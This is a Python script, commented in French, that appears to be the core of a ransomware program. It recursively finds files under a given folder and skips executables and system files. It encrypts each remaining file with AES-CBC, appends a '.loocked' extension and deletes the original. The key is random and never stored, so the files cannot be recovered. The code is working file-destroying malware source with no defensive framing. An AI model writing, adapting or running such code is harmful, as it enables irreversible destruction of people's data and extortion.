import subprocess
import os
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from pathlib import Path


key = os.urandom(32) 
iv = os.urandom(16)

extensions_exclues = (".exe", ".dll", ".sys", ".bat", ".com")


def search_file(base_path):
    #convertion le str path au path
    base_path = Path(base_path)
    #lire recurive le dossier
    for file in base_path.rglob("*"):
        #verifer que le ficher ne pas ficher de systeme
        if file.is_file() and not file.suffix.lower() in extensions_exclues:
            try:
                path_file=str(file) 
                encrypte_file(path_file)
                    
            except Exception as e:
                print(f"Error reading {file}: {e}")
    return True


def encrypte_file(input_file):
    backend = default_backend()
    with open(input_file, 'rb') as f:
        data = f.read()
    
    # car le algorithme de cryptage aes fait cryptage par block 128 bit on ajoute padding si le block dernier doit etre 128 bit
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Créer le cipher AES en     CBC
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()

    #chiffre les donnes
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    #ajouter extension loocked au ficher encrypter
    output_file = input_file + ".loocked"

    with open(output_file, 'wb') as f:
        f.write(iv + encrypted_data)
    
    os.remove(input_file)

    return True
    
